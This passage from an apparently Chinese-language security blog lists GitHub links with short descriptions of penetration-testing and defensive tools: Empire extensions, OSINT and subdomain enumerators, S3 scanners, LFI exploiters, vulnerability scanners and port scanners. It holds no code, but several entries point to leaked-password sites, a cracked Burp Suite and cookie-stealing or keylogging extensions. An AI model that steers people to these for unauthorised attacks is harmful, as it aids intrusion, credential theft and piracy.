class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://paper.tuisec.win/detail/f3dce68a0b4baaa 利用Empire获取域控权限</span><br><span class="line">https://github.com/EmpireProject/Empire-GUI empire的node.js界面</span><br><span class="line">https://github.com/interference-security/empire-web empire的web界面</span><br><span class="line">https://github.com/byt3bl33d3r/DeathStar py3,调用Empire RESTful API 自动化获取域管权限的</span><br><span class="line">https://github.com/infosecn1nja/e2modrewrite 用于将Empire配置文件转换为Apache modrewrite脚本</span><br><span class="line">https://github.com/maxchehab/CSS-Keylogging Chrome扩展程序和Express服务器利用CSS的键盘记录功能。</span><br><span class="line">https://github.com/evilcos/cookiehacker Chrome扩展程序。JavaScript document.cookie / Wireshark Cookie</span><br><span class="line">https://github.com/lfzark/cookie-injecting-tools Chrome扩展，cookie注入工具包括注入，编辑，添加和删除cookie</span><br></pre></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/smicallef/spiderfoot 利用OSINT自动化找出对方信息，gui界面，插件化</span><br><span class="line">https://github.com/Nhoya/gOSINT go，利用OSINT自动化搜集信息</span><br><span class="line">https://github.com/laramies/theHarvester 企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts</span><br><span class="line">https://github.com/guelfoweb/knock 通过爆破进行子域名获取，可用于查找子域名接管漏洞</span><br><span class="line">https://github.com/aboul3la/Sublist3r 通过搜索引擎与爆破快速子域枚举工具</span><br><span class="line">https://github.com/Ice3man543/subfinder 基于go实现的Sublist3r</span><br><span class="line">https://github.com/yanxiu0614/subdomain3 py3、py2的子域名,IP,CDN信息等</span><br><span class="line">https://github.com/caffix/amass 基于go，子域名枚举, 搜索互联网数据源, 使用机器学习猜测子域名</span><br><span class="line">https://github.com/nahamsec/lazyrecon 侦查reconnaissance过程自动化脚本, 可自动使用Sublist3r/certspotter获取子域名, 调用nmap/dirsearch等</span><br><span class="line">https://github.com/s0md3v/ReconDog simple，侦查信息的瑞士军刀</span><br><span class="line">https://github.com/FeeiCN/ESD py3，爆破搜集子域名</span><br><span class="line">https://github.com/alpha1e0/pentestdb 多用途集成化信息搜集工具</span><br><span class="line">https://github.com/se55i0n/PortScanner py2,目标tcp端口快速扫描、banner识别、cdn检测</span><br><span class="line">https://github.com/lijiejie/subDomainsBrute lijiejie开发的一款使用广泛的子域名爆破枚举工具</span><br><span class="line">https://github.com/ring04h/wydomain 猪猪侠开发的一款域名收集全面、精准的子域名枚举工具</span><br><span class="line">https://github.com/n4xh4ck5/N4xD0rk 利用搜索引擎来搜集子域名，可以使用西班牙语搜集</span><br><span class="line">https://github.com/vysec/DomLink py2,调用WHOXY.com，对邮箱和域名进行进一步的搜集</span><br><span class="line">https://github.com/jonluca/Anubis py3.6，子域名爆破与信息搜集</span><br><span class="line">https://github.com/le4f/dnsmaper web界面，子域名枚举爆破工具以及地图位置标记</span><br><span class="line">https://github.com/thewhiteh4t/seeker 获取高精度地理信息和设备信息的工具</span><br><span class="line">https://github.com/0xbug/orangescan web界面，的在线子域名信息收集工具</span><br><span class="line">https://github.com/TheRook/subbrute 扫描器中常用的子域名爆破API库</span><br><span class="line">https://github.com/We5ter/GSDF 基于谷歌SSL透明证书的子域名查询脚本</span><br><span class="line">https://github.com/mandatoryprogrammer/cloudflare_enum 利用CloudFlare的dns进行子域名枚举</span><br><span class="line">https://github.com/ultrasecurity/webkiller 渗透辅助，py，ip信息、端口服务指纹、蜜罐探测、bypass cloudflare</span><br><span class="line">https://github.com/christophetd/CloudFlair cloudflare绕过，获取真实ip，集成censys</span><br><span class="line">https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker 多方式收集目标子域名信息</span><br><span class="line">https://github.com/code-scan/BroDomain 子域名查询</span><br><span class="line">https://github.com/michenriksen/aquatone 子域名枚举、探测工具。可用于子域名接管漏洞探测</span><br><span class="line">https://github.com/chuhades/dnsbrute 基于go，高效的子域名爆破工具</span><br><span class="line">https://github.com/evilsocket/dnssearch 基于go，一款子域名爆破工具</span><br><span class="line">https://github.com/OJ/gobuster 基于go，根据dns查询子域名和web目录爆破的工具</span><br><span class="line">https://github.com/reconned/domained 可用于子域名收集的一款工具</span><br><span class="line">https://github.com/bit4woo/Teemo 多方式域名收集及枚举工具</span><br><span class="line">https://github.com/swisskyrepo/Subdomino 子域名枚举，端口扫描，服务存活确认</span><br><span class="line">https://github.com/nmalcolm/Inventus 通过爬虫实现的子域名收集工具</span><br><span class="line">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework 渗透辅助，php，exp搜寻、payload与shell生产、信息搜集</span><br><span class="line">https://github.com/chrismaddalena/ODIN py3，simple，信息搜集与后期漏洞利用</span><br><span class="line">https://github.com/x0day/bannerscan C段/旁站查询与路径扫描</span><br><span class="line">https://github.com/Xyntax/BingC 基于Bing搜索引擎的C段/旁站查询，多线程，支持API</span><br><span class="line">https://github.com/zer0h/httpscan 网段Web主机发现小工具</span><br><span class="line">https://github.com/lijiejie/BBScan 网站信息泄漏批量扫描脚本</span><br><span class="line">https://github.com/aipengjie/sensitivefilescan 网站敏感文件扫描工具</span><br><span class="line">https://github.com/Mosuan/FileScan 网站敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描</span><br><span class="line">https://github.com/Xyntax/FileSensor 网站敏感文件探测工具</span><br><span class="line">https://github.com/ring04h/weakfilescan 多线程网站泄露信息检测工具</span><br><span class="line">https://github.com/Viralmaniar/Passhunt simple，用于搜索网络设备Web应用程序等的默认凭证。包含523个厂家的2084组默认密码</span><br><span class="line">https://github.com/yassineaboukir/Asnlookup simple,利用ASN搜索特定组织拥有ip，可联动nmap、masscan进行进一步信息扫描</span><br></pre></td></tr></table></figure><h2 id="敏感信息泄露发现"><a href="#敏感信息泄露发现" class="headerlink" title="敏感信息泄露发现"></a><strong>敏感信息泄露发现</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Yelp/detect-secrets PY,防止代码中的密码等相关敏感信息被提交到代码库中，可以在保证安全性的同时不会给开发者的生产力带来任何影响</span><br><span class="line">https://github.com/Acceis/leakScraper 处理和可视化大规模文本文件, 查找敏感信息, 例如证书</span><br><span class="line">https://github.com/Raikia/CredNinja 多线程用户凭证验证脚本，比如验证dump的hash是否属于此机器，利用445端口进行协议验证</span><br><span class="line">https://github.com/CERTCC/keyfinder 查找并分析私钥/公钥文件(文件系统中), 支持 Android APK 文件</span><br><span class="line">https://github.com/Ice3man543/hawkeye go，cli端，文件系统分析工具，快速查找文件内包含的SSH密钥，日志文件，Sqlite数据库，密码文件等</span><br><span class="line">https://github.com/FortyNorthSecurity/EyeWitness 获取目标网站截图、vnc、rdp服务，尝试获取默认凭证</span><br><span class="line">https://github.com/D4Vinci/Cr3dOv3r 根据邮箱自动搜索泄漏的密码信息，也可测试账户密码在各大网站能否登录的工具</span><br></pre></td></tr></table></figure><h2 id="威胁情报分析"><a href="#威胁情报分析" class="headerlink" title="威胁情报分析"></a><strong>威胁情报分析</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://www.databases.today，https://publicdbhost.dmca.gripe/，http://www.wttech.org/，https://hashes.org/leaks.php，https://archive.org/search.php?query= 密码泄露</span><br><span class="line">https://www.threatcrowd.org/ 威胁情报分析平台</span><br><span class="line">https://x.threatbook.cn/ 微步在线 | 威胁情报分析平台-ThreatBook-多引擎在线扫描、恶意软件在线检测</span><br><span class="line">https://github.com/needmorecowbell/sniff-paste 针对 Pastebin 的开源情报收集工具</span><br><span class="line">https://talosintelligence.com/documents/ip-blacklist 恶意IP地址</span><br><span class="line">https://ransomwaretracker.abuse.ch/downloads/RW_IPBL.txt 恶意软件IP地址</span><br><span class="line">https://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=1.1.1.1 洋葱路由出口节点</span><br><span class="line">https://isc.sans.edu/api/threatlist/shodan shodan撒旦扫描器节点</span><br><span class="line">https://github.com/Te-k/harpoon 用于开源和威胁智能的CLI工具</span><br><span class="line">https://trumail.io/ 验证对方邮箱是否为垃圾邮箱，每个月可以免费验证1000次</span><br><span class="line">https://github.com/ChrisJohnRiley/Scythe 验证账号是否为常用账号</span><br><span class="line">https://github.com/fireeye/GeoLogonalyzer 远程身份验证地理位置分析工具，用于区分合法登录和恶意登录。</span><br><span class="line">https://github.com/target/strelka py3，通过实时扫描文件进行威胁情报分析和实时监测。</span><br></pre></td></tr></table></figure><h2 id="托管云安全"><a href="#托管云安全" class="headerlink" title="托管云安全"></a><strong>托管云安全</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/stuhirst/awssecurity/blob/master/arsenal.md AWS 安全检测相关的项目列表</span><br><span class="line">https://github.com/toniblyx/my-arsenal-of-aws-security-tools AWS安全工具集</span><br><span class="line">https://github.com/sa7mon/S3Scanner 扫描amazon公开的S3 buckets和dump</span><br><span class="line">https://github.com/kromtech/s3-inspector 检测亚马逊AWS S3 bucket permissions</span><br><span class="line">https://github.com/jordanpotti/AWSBucketDump 枚举AWS S3 buckets以查找敏感机密的文件</span><br><span class="line">https://github.com/sa7mon/S3Scanner 扫描amazon公开的S3 buckets和dump</span><br><span class="line">https://github.com/kromtech/s3-inspector 检测亚马逊AWS S3 bucket permissions</span><br><span class="line">https://github.com/jordanpotti/AWSBucketDump 枚举AWS S3 buckets以查找敏感机密的文件</span><br><span class="line">https://github.com/Netflix/repokid AWS 最低权限策略部署工具</span><br><span class="line">https://github.com/RhinoSecurityLabs/pacu AWS漏洞检测框架</span><br><span class="line">https://github.com/0xbug/Hawkeye GitHub 泄露监控系统</span><br><span class="line">https://github.com/neal1991/gshark github信息泄露检测</span><br><span class="line">https://github.com/VKSRC/Github-Monitor GitHub监控，代码信息泄露，分钟级监控，邮件预警</span><br><span class="line">https://github.com/metac0rtex/GitHarvester github Repo信息搜集工具</span><br><span class="line">https://github.com/repoog/GitPrey GitHub敏感信息扫描工具</span><br><span class="line">https://github.com/FeeiCN/GSIL py3，近实时监控Github敏感信息，并发送告警通知。</span><br><span class="line">https://github.com/UnkL4b/GitMiner github敏感内容挖掘</span><br><span class="line">https://github.com/dxa4481/truffleHog GitHub敏感信息扫描工具,包括检测commit等</span><br><span class="line">https://github.com/Hell0W0rld0/Github-Hunter github信息监测脚本</span><br><span class="line">https://github.com/awslabs/git-secrets 防止将敏感数据提交到 git 仓库的工具</span><br><span class="line">https://github.com/zricethezav/gitleaks 基于go的，检查git repo中的密码信息和密钥</span><br></pre></td></tr></table></figure><h2 id="目录路径发现"><a href="#目录路径发现" class="headerlink" title="目录路径发现"></a><strong>目录路径发现</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/maurosoria/dirsearch 经典目录路径扫描</span><br><span class="line">https://github.com/TheM4hd1/PenCrawLer C#界面，web爬虫与目录路径爆破工具，除了常规扫描增加了递归爆破模式</span><br><span class="line">https://github.com/Xyntax/DirBrute 目录路径爆破工具</span><br><span class="line">https://github.com/abaykan/crawlbox 目录路径路径扫描器</span><br><span class="line">https://github.com/deibit/cansina 目录路径路径扫描器</span><br><span class="line">https://github.com/UltimateHackers/Breacher 多线程的后台路径扫描器，也可用于发现Execution After Redirect漏洞</span><br><span class="line">https://github.com/fnk0c/cangibrina 通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器</span><br><span class="line">https://github.com/Go0s/SitePathScan 基于协程的目录路径爆破工具，配合aiohttp扫描路径比之前快了三倍有余</span><br><span class="line">https://github.com/secfree/bcrpscan 基于爬虫的web路径扫描器</span><br></pre></td></tr></table></figure><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a><strong>本地文件包含漏洞</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/hvqzao/liffy 本地文件包含漏洞利用工具</span><br><span class="line">https://github.com/D35m0nd142/Kadabra 本地文件包含漏洞扫描和利用工具</span><br><span class="line">https://github.com/P0cL4bs/Kadimus 本地文件包含漏洞扫描和利用工具</span><br><span class="line">https://github.com/D35m0nd142/LFISuite 本地文件包含漏洞利用及扫描工具，支持反弹shell</span><br><span class="line">https://github.com/OsandaMalith/LFiFreak 本地文件包含漏洞利用及扫描工具，支持反弹shell</span><br></pre></td></tr></table></figure><h2 id="安全测试与扫描器框架"><a href="#安全测试与扫描器框架" class="headerlink" title="安全测试与扫描器框架"></a><strong>安全测试与扫描器框架</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zaproxy/zaproxy The OWASP ZAP core project出品的综合性渗透测试工具。由于其流量代理、请求重放和可扩展性拿来做模糊测试未尝不可</span><br><span class="line">https://github.com/x-Ai/BurpUnlimitedre burpsuite 1.7.27的永久破解版</span><br><span class="line">https://github.com/andresriancho/w3af 知名插件化扫描器</span><br><span class="line">https://github.com/juansacco/exploitpack 渗透测试集成框架，包含超过38,000+ exploits</span><br><span class="line">https://github.com/Lucifer1993/AngelSword Web应用漏洞扫描框架,python3，300poc</span><br><span class="line">https://github.com/Xyntax/POC-T 渗透测试插件化扫描框架，自带poc，并发扫描</span><br><span class="line">https://github.com/knownsec/Pocsuite 知道创宇维护的一个规范化POC/EXP利用框架</span><br><span class="line">https://github.com/leisurelicht/Pocsuite3 Pocsuite用py3重写</span><br><span class="line">https://github.com/Eitenne/roxysploit 漏洞利用框架，支持永恒之蓝直接利用</span><br><span class="line">https://github.com/TophantTechnology/osprey 斗象能力中心出品并长期维护的一个规范化POC/EXP利用框架</span><br><span class="line">https://github.com/he1m4n6a/btScan 大黑阔的插件化漏洞利用工具</span><br><span class="line">https://github.com/boy-hack/w9scan python下内置1200+插件可对网站进行一次规模的检测</span><br><span class="line">https://github.com/WooYun/TangScan 乌云维护的一个规范化POC/EXP利用框架</span><br><span class="line">https://github.com/n0tr00t/Beebeeto-framework Beebeeto是由众多安全研究人员所共同维护的一个规范化POC/EXP利用框架</span><br><span class="line">https://github.com/erevus-cn/pocscan 一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC，可使用docker部署</span><br><span class="line">https://github.com/DavexPro/PocHunter 借鉴pocscan 的一款多利用框架poc适配框架</span><br><span class="line">https://github.com/theInfectedDrake/TIDoS-Framework 覆盖从侦察到漏洞分析的所有内容</span><br><span class="line">https://github.com/gyoisamurai/GyoiThon 使用深度学习的渗透测试工具, 从每次扫描数据中学习, 扫描越多, 软件检测精准度越高</span><br><span class="line">https://github.com/euphrat1ca/polar-scan 易语言的北极熊扫描器</span><br><span class="line">https://github.com/euphrat1ca/yeezy-scan 椰树1.9扫描器</span><br><span class="line">https://github.com/euphrat1ca/WebCruiserWVS 轻量级基于C#的扫描器，椰树扫描器的前身</span><br><span class="line">https://github.com/Skycrab/leakScan web界面，漏洞扫描</span><br><span class="line">https://github.com/az0ne/AZScanner web界面，自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测</span><br><span class="line">https://github.com/boy-hack/w8scan web界面，基于bugscan扫描和架构思想的扫描器</span><br><span class="line">https://github.com/MiniSafe/microweb web界面，base bugscan，django</span><br><span class="line">https://github.com/taipan-scanner/Taipan web界面，基于F#与C#的安全扫描器</span><br><span class="line">https://github.com/zhangzhenfeng/AnyScan web界面，python漏洞扫描器</span><br><span class="line">https://github.com/Canbing007/wukong-agent web界面，python漏洞扫描器</span><br><span class="line">https://github.com/dermotblair/webvulscan web界面，php，漏洞扫描器，支持输出pdf报告</span><br><span class="line">https://github.com/jeffzh3ng/InsectsAwake web界面，基于 Flask 应用框架的漏洞扫描系统，同时集成了渗透测试常用的端口扫描、子域名爆破等功能，后端漏洞扫描采用Pocsuite</span><br><span class="line">https://github.com/0xInfection/TIDoS-Framework py，linux，网站扫描器</span><br><span class="line">https://github.com/secdec/adapt py,linux，网站扫描器</span><br><span class="line">https://github.com/sullo/nikto perl，linux，kali内置的网站扫描器</span><br><span class="line">https://github.com/Ekultek/Zeus-Scanner web扫描器，联动Geckodriver，nmap和sqlmap</span><br><span class="line">https://github.com/blackye/lalascan 集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架</span><br><span class="line">https://github.com/blackye/BkScanner BkScanner 分布式、插件化web漏洞扫描器</span><br><span class="line">https://github.com/tlkh/prowler 一款基于Raspberry Pi Cluster 的网络漏洞扫描工具</span><br><span class="line">https://github.com/netxfly/passive_scan 基于http代理的web漏洞扫描器</span><br><span class="line">https://github.com/1N3/Sn1per php，自动化中间件扫描以及设备指纹识别</span><br><span class="line">https://github.com/Tuhinshubhra/RED_HAWK php，集成信息收集、漏洞扫描、指纹识别等的扫描工具</span><br><span class="line">https://github.com/m4ll0k/Spaghetti web应用扫描器，支持指纹识别、文件目录爆破、SQL/XSS/RFI等漏洞扫描，也可直接用于struts、ShellShock等漏洞扫描</span><br><span class="line">https://github.com/v3n0m-Scanner/V3n0M-Scanner 支持检测SQLi/XSS/LFI/RFI等漏洞的扫描器</span><br><span class="line">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest 集成子域名枚举、nmap、waf指纹识别等模块的web应用扫描器</span><br><span class="line">https://github.com/RASSec/pentestEr_Fully-automatic-scanner 定向自动测试工具</span><br><span class="line">https://github.com/Fireflyi/lcyscan py，插件化漏洞扫描器，支持生成报表</span><br><span class="line">https://github.com/Arachni/arachni Web应用漏洞扫描框架，支持REST、RPC等api调用</span><br><span class="line">https://github.com/swisskyrepo/DamnWebScanner 基于chrome/opera插件的被动式漏洞扫描</span><br><span class="line">https://github.com/0xsauby/yasuo ruby,扫描主机第三方web应用服务漏洞</span><br><span class="line">https://github.com/yangbh/Hammer Web应用漏洞扫描</span><br><span class="line">https://github.com/viraintel/OWASP-Nettacker 自动化渗透测试框架</span><br><span class="line">https://github.com/flipkart-incubator/watchdog 全面的web扫描器与漏洞利用工具</span><br><span class="line">https://github.com/Fplyth0ner-Combie/Bug-Project-Framework 易语言，模仿msf的漏洞利用框架，自带exp编辑器</span><br><span class="line">https://github.com/PowerScript/KatanaFramework py，模仿msf的漏洞利用框架，还有些ssh、压缩包破解工具</span><br><span class="line">https://github.com/m4ll0k/Galileo py2，网站扫描器</span><br><span class="line">https://github.com/samhaxr/hackbox py2，simple，网站扫描器</span><br><span class="line">https://github.com/secrary/EllaScanner py3，simple，被动式漏洞扫描，支持历史cve编号漏洞识别</span><br><span class="line">https://github.com/m4ll0k/WAScan py，simple，扫描页面/链接/脚本/Form, 测试Payload等</span><br><span class="line">https://github.com/jiangsir404/S7scan py,已用1，七种综合检测</span><br><span class="line">https://github.com/hatRiot/clusterd py，simple，web漏洞利用</span><br><span class="line">https://github.com/M4cs/BabySploit py,simple,模仿msf</span><br><span class="line">https://github.com/iceyhexman/onlinetools simple，web界面，在线cms指纹识别|旁站|c段|信息泄露|工控|系统|物联网安全|cms漏洞扫描|端口扫描|等</span><br><span class="line">https://github.com/tulpar/tulpar simple,支持多种web漏洞扫描</span><br><span class="line">https://github.com/UltimateHackers/Striker simple，信息搜集、cms利用与漏扫，侦察绕过Cloudflare</span><br><span class="line">https://github.com/0x4D31/salt-scanner 基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA、slack平台结合使用</span><br><span class="line">https://github.com/opensec-cn/kunpeng go，POC检测框架，以动态链接库的形式提供各种语言调用</span><br></pre></td></tr></table></figure><h2 id="运维安全服务与资产管理"><a href="#运维安全服务与资产管理" class="headerlink" title="运维安全服务与资产管理"></a><strong>运维安全服务与资产管理</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/chaitin/cloudwalker CloudWalker（牧云）服务器安全管理平台，逐步覆盖服务器资产管理、威胁扫描、Webshell 查杀、基线检测等功能。</span><br><span class="line">https://github.com/mitre/caldera mitre公司模拟攻击测试系统，主要是在win下</span><br><span class="line">https://github.com/guardicore/monkey 评估网络安全状况，分为扫描器与C2C服务器，利用默认口令与exp对ssh、smb等多种协议方式进行攻击检测</span><br><span class="line">https://github.com/grayddq/PublicSecScan 调用awvs对大量WEB资产进行分布式WEB安全扫描，发现web环境下常规的一些安全漏洞</span><br><span class="line">https://github.com/jeffzh3ng/Fuxi-Scanner 资产管理，漏洞检测集成awvs、创宇Pocsuite、nmap、hydra</span><br><span class="line">https://github.com/infobyte/faraday 协作渗透测试和漏洞管理平台，集成多种</span><br><span class="line">https://github.com/DefectDojo/django-DefectDojo 基于django的漏洞资产管理平台</span><br><span class="line">https://github.com/creditease-sec/insight web界面，宜信安全部开发，集成应用系统资产管理、漏洞全生命周期管理、安全知识库管理三位一体的管理平台</span><br><span class="line">https://github.com/RASSec/A_Scan_Framework 漏洞管理、资产管理、任务扫描系统</span><br><span class="line">https://github.com/cea-sec/ivre 网络资产指纹发现，搭建属于自己的shodan与zoomeye</span><br><span class="line">https://github.com/ysrc/xunfeng web界面，同程安全开发的网络资产识别引擎，漏洞检测引擎</span><br><span class="line">https://github.com/superhuahua/xunfengES web界面，base巡风开发，一个人的安全</span><br><span class="line">https://github.com/zhaoweiho/SecurityManageFramwork py3，django。企业内网安全管理平台，包含资产管理，漏洞管理，账号管理，知识库管、安全扫描自动化功能模块</span><br><span class="line">https://github.com/grayddq/PublicMonitors 对公网IP列表进行端口服务扫描，发现周期内的端口服务变化情况和弱口令安全风险。一个人的安全部</span><br><span class="line">https://github.com/grayddq/PubilcAssetInfo 主要目标是以甲方安全人员的视角，尽可能收集发现企业的域名和服务器公网IP资产。如百度云、阿里云、腾讯云等。一个人的安全部</span><br><span class="line">https://github.com/maya6/SiteScan web界面，py3 celery。资产收集</span><br><span class="line">https://github.com/ywolf/F-NAScan py2.6，网络资产、端口服务搜集整理，生成报表显示。快速</span><br><span class="line">https://github.com/flipkart-incubator/RTA 扫描公司内部所有在线设备, 提供整体安全视图, 标示所有安全异常</span><br><span class="line">https://github.com/0xbug/Biu-framework 企业内网基础服务安全扫描框架</span><br></pre></td></tr></table></figure><h2 id="上传漏洞利用"><a href="#上传漏洞利用" class="headerlink" title="上传漏洞利用"></a><strong>上传漏洞利用</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/UltimateHackers/Arjun 扫描网页, 使用正则表达式爆破查找隐藏的GET/POST参数</span><br><span class="line">https://github.com/3xp10it/xupload 用于自动测试上传功能是否可上传webshell的工具</span><br><span class="line">https://github.com/gunnerstahl/JQShell py3，CVE-2018-9206 jQuery File Upload利用工具</span><br><span class="line">https://github.com/destine21/ZIPFileRaider burp插件，测试zip文件上传漏洞</span><br><span class="line">https://github.com/jpiechowka/zip-shotgun py，测试zip文件上传漏洞</span><br></pre></td></tr></table></figure><h2 id="端口发现服务指纹识别"><a href="#端口发现服务指纹识别" class="headerlink" title="端口发现服务指纹识别"></a><strong>端口发现服务指纹识别</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nmap/nmap LUA,Nmap端口扫描器，具有有强大的脚本引擎框架</span><br><span class="line">https://github.com/robertdavidgraham/masscan C,无状态扫描，可以调用nmap进行指纹识别</span><br><span class="line">https://github.com/zmap/zmap C,无状态扫描，需要用C编写扩展模块</span><br><span class="line">https://github.com/zmap/zgrab go，基于zmap扫描器进行指纹识别、调度管理，可绕过CDN</span><br><span class="line">https://github.com/chichou/grab.js 类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议</span><br><span class="line">https://github.com/johnnyxmas/scancannon shell,联动masscan和nmap</span><br><span class="line">https://github.com/OffensivePython/Nscan 基于Masscan和Zmap的网络扫描器</span><br><span class="line">https://github.com/ring04h/wyportmap 调用nmap目标端口扫描+系统服务指纹识别</span><br><span class="line">https://github.com/angryip/ipscan Angry IP Scanner，跨平台界面化端口扫描器</span><br><span class="line">https://github.com/EnableSecurity/wafw00f WAF产品指纹识别</span><br><span class="line">https://github.com/rbsec/sslscan ssl类型识别</span><br><span class="line">https://github.com/urbanadventurer/whatweb web指纹识别</span><br><span class="line">https://github.com/Rvn0xsy/FastWhatWebSearch whatweb工具结果搜索平台</span><br><span class="line">https://github.com/tanjiti/FingerPrint 